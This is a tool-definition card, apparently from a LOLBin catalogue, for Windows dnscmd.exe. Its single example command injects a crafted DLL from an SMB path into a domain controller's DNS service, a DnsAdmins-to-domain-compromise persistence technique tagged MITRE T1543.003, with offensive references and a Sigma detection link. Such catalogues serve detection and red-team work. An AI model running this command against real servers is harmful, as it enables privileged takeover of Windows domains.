---
id: windows-execution-dnscmd
namespace: windows:execution:dnscmd
name: dnscmd
description: 'A command-line interface for managing DNS servers Located at: C:\Windows\System32\Dnscmd.exe; C:\Windows\SysWOW64\Dnscmd.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- dnscmd
parameters: []
features: []
execution:
  template: dnscmd
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details. (Remotely inject dll to dns server)
  command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
references:
- label: feature-not-bug-dnsadmin-to-dc-compromise-in-one-l
  url: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
- label: hunting-dns-server-level-plugin-dll-injection.html
  url: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
- label: dns-plugindll-vcpp
  url: https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
- label: '994000792628719618'
  url: https://twitter.com/Hexacorn/status/994000792628719618
- label: abusing-dnsadmins-privilege-for-escalation-in-acti
  url: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
techniques:
- execution
- persistence
mitre_ids:
- T1543.003
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
- type: ioc
  description: Dnscmd.exe loading dll from UNC/arbitrary path
install:
- method: choco
  package_name: dnscmd
  commands:
  - choco install dnscmd
---


# dnscmd

dnscmd is a Windows LOLBin. A command-line interface for managing DNS servers Located at: C:\Windows\System32\Dnscmd.exe; C:\Windows\SysWOW64\Dnscmd.exe.
